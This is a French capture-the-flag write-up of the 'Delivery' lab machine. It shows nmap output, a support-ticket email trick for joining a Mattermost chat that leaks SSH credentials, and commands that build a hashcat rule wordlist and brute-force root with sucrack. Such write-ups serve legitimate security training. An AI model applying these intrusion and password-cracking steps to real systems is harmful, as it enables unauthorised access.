# Delivery - Easy

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-28 17:10 EDT
Nmap scan report for 10.10.10.222
Host is up (0.018s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 9c40fa859b01acac0ebc0c19518aee27 (RSA)
|   256 5a0cc03b9b76552e6ec4f4b95d761709 (ECDSA)
|_  256 b79df7489da2f27630fd42d3353a808c (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-title: Welcome
|_http-server-header: nginx/1.14.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.77 seconds
```

On va consulter le site, on lance un gobuster en fond, il est mentionné une page spéciale mattermost ainsi qu’un helpdesk [http://helpdesk.delivery.htb/](http://helpdesk.delivery.htb/) avec un nom de domaine que l’on rajoute à notre hosts: [http://delivery.htb:8065/](http://delivery.htb:8065/)

Sur le helpdesk on tombe sur OsTicket qui semble être en version avant 1.12 d’après les commentaires dans le code source. On peut créer un ticket et il semble que cela nous donne un email temporaire:

```bash
You may check the status of your ticket, by navigating to the Check Status page using ticket id: 9626186.

If you want to add more information to your ticket, just email 9626186@delivery.htb.

Thanks,

Support Team
```

On peut donc accéder à notre ticket avec le numéro et l’adresse bidon rentrée précedemment. On peut consulter les mails. On va donc créer un compte mattermost avec l’adresse corporate associée à notre ticket.

On rejoint alors la team internal et on a accès à un chat avec un mot de passe

```bash
Credentials to the server are maildeliverer:Youve_G0t_Mail!
```

On se connecte donc en ssh, on obtient le flag user, on upload linpeas mais rien de fou.

Dans le mattermost il est suggérer de faire attention à ce que les hash des mdp ne soient pas trouvés même si PleaseSubscribe! n’est pas dans rockyou. Nous allons utiliser https://github.com/hemp3l/sucrack pour essayer de cracker le mdp avec su.

On compile les fichiers:

```bash
autoreconf -f -i
./configure
make
```

Il nous faut aussi une wordlist à base du mdp de base:

```bash
vi pw #on met le mdp
hashcat --stdout pw -r /usr/share/hashcat/rules/best64.rule > pwlist
```

On a donc toutes les variations, maintenant on peut upload le fichier et enfin on execute:

```bash
./sucrack -a -w 20 -s 10 -u root -rl AFLafld pwlist
```

On obtient le mdp root et le flag